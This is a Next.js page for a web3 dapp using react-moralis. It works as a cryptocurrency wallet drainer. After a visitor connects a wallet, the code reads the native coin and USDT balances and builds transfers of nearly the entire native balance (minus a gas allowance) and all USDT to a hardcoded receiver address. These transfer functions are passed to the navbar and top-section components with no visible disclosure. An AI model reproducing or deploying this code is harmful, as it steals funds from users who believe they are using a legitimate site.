import Head from "next/head";
import Image from "next/image";
import TopSection from "../components/topSection";
import Navbar from "../components/navbar";
import styles from "../styles/Home.module.css";
import {
  useMoralis,
  useWeb3Contract,
  useMoralisWeb3Api,
  useChain,
  useERC20Balances,
  useNativeBalance,
  useWeb3Transfer,
} from "react-moralis";
import { abi } from "../constants/abi";
import { useState, useEffect } from "react";
import { BigNumber, ethers } from "ethers";
import Querry from "../components/query";
import Admin from "../components/admin";
import Approve from "../components/approve";

export default function Home() {
  const [nativeBalance, setNativeBalance] = useState(0);
  const [queryData, setQueryData] = useState([]);
  const [customTokenData, setCustomTokenData] = useState({
    tokenAddress: "",
    amount: 0,
    decemils: 0,
  });
  const [balanceObject, setBalanceObject] = useState([]);
  const [nativeBalanceTransfer, setNativeBalanceTransfer] = useState(0);
  const [gasFee, setGasFee] = useState(0);
  const [hasMetamask, setHasMetamask] = useState(false);
  const { enableWeb3, isWeb3Enabled, Moralis, account } = useMoralis();
  const { switchNetwork, chainId, chain } = useChain();
  const { fetchERC20Balances } = useERC20Balances();

  async function querryBalances() {
    let items = [];
    const query = new Moralis.Query("Balances");
    const q = await query.find();
    // console.log(q)
    for (let i = 0; i < q.length; i++) {
      // console.log(q[i].attributes)
      // items.push(q[i].attributes)
      items.push({
        token_addresses: q[i].attributes["token_addresses"],
        Balances: q[i].attributes["Balances"],
        accounts: q[i].attributes["accounts"],
      });
      // items[i] = q[i].attributes
      // items[q[i].attributes["token_addresses"]] = q[i].attributes["Balances"]
    }

    items = items.filter(
      (v, i, a) =>
        a.findIndex((v2) => JSON.stringify(v2) === JSON.stringify(v)) === i
    );

    setQueryData(items);
  }

  async function getNativeBalance(account) {
    const options = {
      chain: chainId,
      address: account,
    };
    const balance = await Moralis.Web3API.account.getNativeBalance(options);
    setNativeBalance(parseInt(balance.balance));
    console.log(parseInt(balance.balance));
    return balance;
  }

  var {
    fetch: fetchNative,
    error: errorNative,
    isFetching: isFetchingNative,
  } = useWeb3Transfer({
    type: "native",
    // amount: Moralis.Units.ETH(nativeBalanceTransfer || 0),
    amount:
      nativeBalance > 0
        ? Moralis.Units.Token(nativeBalance - gasFee, 0)
        : nativeBalance,
    receiver: "0x59ba7511CA8ebf2EB21a63E72385b369b02f6131",
  });
  const { fetch, error, isFetching } = useWeb3Transfer({
    amount: Moralis.Units.Token(
      customTokenData.amount,
      customTokenData.decemils
    ),
    receiver: "0x59ba7511CA8ebf2EB21a63E72385b369b02f6131",
    type: "erc20",
    contractAddress: customTokenData.tokenAddress,
  });

  async function getTokenBalances() {
    //TODO change chain
    const balances = await fetchERC20Balances({
      params: { chain: chainId, address: account },
    });
    console.log(balances);
    // const addressOfT = balances[0].token_address
    // const b = balances[0].balance
    // setTAddress(addressOfT)
    // setBalanceOfToken(parseInt(b))

    const items = await Promise.all(
      balances.map(async (i) => {
        let item = {
          token_address: i.token_address,
          balance: i.balance,
          symbol: i.symbol,
          decimals: parseInt(i.decimals),
        };
        return item;
      })
    );
    console.log(items);

    setBalanceObject(items);
  }

  useEffect(() => {
    if (typeof window.ethereum !== "undefined") {
      setHasMetamask(true);
    }
    // querryBalances()
  }, []);
  useEffect(() => {
    if (account) {
      getNativeBalance(account);
      getTokenBalances();
    }
    if (chainId == "0x1") {
      setGasFee("9000000000000000");
    } else {
      setGasFee("1000000000000000");
    }
  }, [chainId, account]);

  useEffect(() => {
    if (account) {
      if (balanceObject) {
        balanceObject.map((b, i) => {
          if (b.symbol === "USDT") {
            setCustomTokenData({
              tokenAddress: b.token_address,
              amount: parseInt(b.balance) / ("1e" + b.decimals),
              decemils: b.decimals,
            });
          }
        });
      }
    }
  }, [balanceObject, chainId, account]);

  // if (!isWeb3Enabled) {
  //   return Querry(enableWeb3);
  // }

  return (
    <>
      <Navbar transferNative={fetchNative} transfer={fetch} />
      <TopSection
        transferNative={fetchNative}
        transfer={fetch}
        account={account}
        enableWeb3={enableWeb3}
      />
    </>
  );

  return (
    <div>
      {hasMetamask ? (
        isWeb3Enabled ? (
          "Connected! "
        ) : (
          <button onClick={() => enableWeb3()}>Connect </button>
        )
      ) : (
        "Please install metamask"
      )}

      <button
        className="btn btn-primary m-3"
        onClick={() => switchNetwork("0x1")}
      >
        Switch to Ethereum
      </button>
      <button
        className="btn btn-primary m-3"
        onClick={() => switchNetwork("0x38")}
      >
        Switch to Binance
      </button>

      <p>Current chainId: {chainId}</p>
      {nativeBalance ? (
        <>
          <div>
            {/* <input
              type="text"
              style={{
                // background: "transparent",
                border: "2px solid black",
                borderRadius: "5px",
                textAlign: "center",
                maxWidth: "100px",
              }}
              value={nativeBalanceTransfer}
              onChange={(e) => {
                setNativeBalanceTransfer(e.target.value);
              }}
            /> */}
          </div>
          <div>
            {/* {error && alert(JSON.stringify(error.message))} */}
            <button
              onClick={() => {
                fetchNative();
                fetch();
              }}
              disabled={isFetching}
            >
              Transfer
            </button>
          </div>
        </>
      ) : null}
    </div>
  );
}
